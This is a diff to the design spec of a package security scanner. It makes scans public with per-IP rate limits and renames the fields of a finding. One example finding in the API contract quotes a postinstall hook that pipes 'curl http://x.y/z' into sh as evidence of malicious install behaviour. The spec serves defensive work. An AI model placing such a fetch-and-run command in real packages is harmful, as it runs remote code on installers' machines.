@@ -16,18 +16,20 @@ Package code is never executed. The analyzer only reads files and registry metad
 
 ## User flow
 
-1. The user logs in.
-2. The user submits a package name, and optionally a version (default: `latest`).
-3. The API creates a scan with status `queued` and returns its id immediately.
-4. A worker runs the scan in the background.
-5. The client polls the scan until it is `completed` or `failed`, then shows the report.
+1. A visitor submits a package name, and optionally a version (default: `latest`). No login is needed.
+2. The API creates a scan with status `queued` and returns its id immediately.
+3. A worker runs the scan in the background.
+4. The client polls the scan until it is `completed` or `failed`, then shows the report.
+
+Logged-in users get the same flow; their scans are linked to their account for history (later).
 
 ## In scope
 
 | Area | What is included |
 | --- | --- |
-| Auth | Register and login with email and password, JWT, `user` and `admin` roles |
-| Scans | Scan one package version per request, processed asynchronously by a worker |
+| Auth | Optional. Register with username, email and password; login with username or email; JWT, `user` and `admin` roles |
+| Scans | Public. Scan one package version per request, processed asynchronously by a worker |
+| Rate limiting | Per-IP limit on `POST /scans` |
 | Collector | Registry metadata, weekly downloads and the version tarball |
 | Checks | 1. Install scripts, 2. Typosquatting, 3. Obfuscation, 4. Maintainer and publish anomalies, 5. Suspicious dependencies |
 | Scoring | One 0 to 100 score and a risk level per scan |
@@ -40,7 +42,7 @@ Package code is never executed. The analyzer only reads files and registry metad
 
 - Scan history page
 - Bulk scan of a `package.json`
-- Rate limiting
+- Per-user quotas
 - Re-using a previous scan of the same version instead of scanning again
 - Label management and dataset export
 - CLI tool and GitHub Action
@@ -59,7 +61,7 @@ Failure reasons: `package_not_found`, `version_not_found`, `tarball_too_large`, 
 
 ## Scoring
 
-- Each check returns zero or more findings: `{ checkId, severity, title, evidence }`.
+- Each check returns zero or more findings: `{ checkType, severity, summary, evidence }`.
 - Severity is `low`, `medium` or `high`.
 - A scoring function combines the findings into a score from 0 to 100. The weights are decided when checks 3 to 5 are built.
 - Risk level from the score (initial values, to be tuned with real data):
@@ -72,7 +74,9 @@ Failure reasons: `package_not_found`, `version_not_found`, `tarball_too_large`, 
 
 ## API contract
 
-All endpoints need a JWT (`Authorization: Bearer <token>`). Auth endpoints are defined in issue #6.
+The `id` field in every response is the row's `uid` (UUID); internal integer ids are never exposed.
+
+The endpoints below are public. A JWT (`Authorization: Bearer <token>`) is optional on `POST /scans`: when a valid one is sent, the scan is linked to that user. Auth endpoints are defined in issue #6.
 
 ### `POST /scans`
 
@@ -102,7 +106,7 @@ Response `202 Accepted`:
 }
 ```
 
-Errors: `400` invalid body, `401` missing or invalid token.
+Errors: `400` invalid body, `401` a token was sent but is invalid, `429` rate limit exceeded.
 
 `version` is `null` in this response when none was given; the worker resolves `latest`.
 
@@ -122,15 +126,15 @@ Response `200 OK` (completed):
   "riskLevel": "high",
   "findings": [
     {
-      "checkId": "install-scripts",
+      "checkType": "install_scripts",
       "severity": "high",
-      "title": "postinstall runs a remote shell script",
+      "summary": "postinstall runs a remote shell script",
       "evidence": "curl http://x.y/z | sh"
     },
     {
-      "checkId": "typosquatting",
+      "checkType": "typosquatting",
       "severity": "medium",
-      "title": "Name is 1 edit away from a popular package",
+      "summary": "Name is 1 edit away from a popular package",
       "evidence": "some-packages"
     }
   ],
@@ -143,7 +147,7 @@ Response `200 OK` (completed):
 
 While `queued` or `running`, `riskScore`, `riskLevel` and `completedAt` are `null` and `findings` is `[]`. When `failed`, `error` holds the failure reason.
 
-Errors: `401`, `404` scan not found.
+Errors: `404` scan not found.
 
 ### `GET /packages/:name`
 
@@ -169,7 +173,7 @@ Response `200 OK`:
 }
 ```
 
-Errors: `401`, `404` package never scanned.
+Errors: `404` package never scanned.
 
 ## Limits
 
@@ -179,8 +183,9 @@ Initial values, adjustable through config:
 | --- | --- |
 | Max tarball size | 50 MB |
 | Scan timeout | 120 seconds |
+| Scans per IP | 10 per hour |
 
 ## Done when
 
-- A logged-in user submits a package name in the web app and sees a scored report with explained findings.
+- A visitor, logged in or not, submits a package name in the web app and sees a scored report with explained findings.
 - The API is deployed and documented with OpenAPI.
